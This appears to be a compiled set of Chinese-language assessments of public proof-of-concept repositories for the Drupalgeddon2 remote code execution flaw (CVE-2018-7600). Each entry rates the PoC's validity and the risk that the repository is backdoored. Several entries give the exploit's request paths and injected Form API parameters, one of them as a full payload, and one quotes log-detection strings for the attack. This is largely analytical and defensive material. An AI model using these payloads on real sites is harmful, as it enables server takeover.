**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

